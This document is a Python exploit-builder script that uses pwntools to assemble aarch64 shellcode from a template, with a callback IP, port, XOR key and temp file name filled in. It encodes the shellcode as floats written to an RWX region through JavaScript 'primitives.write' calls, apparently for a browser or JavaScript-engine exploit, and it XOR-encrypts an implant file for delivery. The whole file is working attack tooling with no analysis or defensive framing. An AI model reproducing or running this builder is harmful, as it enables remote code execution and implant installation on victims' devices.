import struct
import socket
from pwn import *
import os


payload_template = "payload.template"
javascript_template = "toast.template"
exploit_output = "toast.js"
ip = "127.0.0.1"
port = 8080
xor_key = int.from_bytes(os.urandom(8), 'little')
tmp_file = b"pprt"

def extract_ip_bytes(ip):
    bytes = socket.inet_aton(ip)
    return struct.unpack("<HH", bytes)

def port_to_little_endian(port):
    bytes = struct.pack(">H", port)
    return struct.unpack("<H", bytes)[0]

def extract_xor_bytes(xor_key):
    bytes = struct.pack("<Q", xor_key)
    return struct.unpack("<HHHH", bytes)

def extract_file_bytes(file_name):
    return struct.unpack("<HH", file_name)

def gen_payload(template_file):
    with open(template_file) as f:
        template = f.read()

    ip_bytes_2_3, ip_bytes_0_1 = extract_ip_bytes(ip)
    port_little_endian = port_to_little_endian(port)
    xor_bytes_0_1, xor_bytes_2_3, xor_bytes_4_5, xor_bytes_6_7 = extract_xor_bytes(xor_key)
    tmp_bytes_0_1, tmp_bytes_2_3 = extract_file_bytes(tmp_file)

    asmbly = template.format(template, PORT_LITTLE_ENDIAN=port_little_endian, IP_BYTES_2_3=ip_bytes_2_3, IP_BYTES_0_1=ip_bytes_0_1, TMP_FILE_BYTES_0_1=tmp_bytes_0_1, TMP_FILE_BYTES_2_3=tmp_bytes_2_3, XOR_KEY_BYTES_0_1=xor_bytes_0_1, XOR_KEY_BYTES_2_3=xor_bytes_2_3, XOR_KEY_BYTES_4_5=xor_bytes_4_5, XOR_KEY_BYTES_6_7=xor_bytes_6_7,)


    return asmbly

def xor_file(key, implant, output):
    with open(implant, 'rb') as f:
        data = f.read()
    with open(output, 'wb') as f:
        for i in range(0, len(data), 8):
            int_var = int.from_bytes(data[i:i+8], "little")
            int_enc = int_var ^ key
            enc_data = int_enc.to_bytes(8, "little")
            f.write(enc_data)

def to_float(word):
    return struct.unpack("<d", word)[0]


def asm_to_javascript(asmbly):
    context.arch = 'aarch64'
    shellcode = asm(asmbly)
    javascript = ""
    for i in range(0, len(shellcode)//8):
        javascript += f"primitives.write(rwx, {to_float(shellcode[i*8:8*i+8])}, {i+1})\n"

    return javascript


def gen_exploit(js_template, exploit_code, output):
    with open(js_template, "r") as f:
        js = f.read()

    

    exploit = js % exploit_code 
    with open(output, "w") as f:
        f.write(exploit)

def main():
    asmbly = gen_payload(payload_template)
    xor_file(xor_key, "test-file", "xored")
    xor_file(xor_key, "xored", "test2")
    js = asm_to_javascript(asmbly)
    gen_exploit(javascript_template, js, exploit_output)

if __name__ == "__main__":
    main()

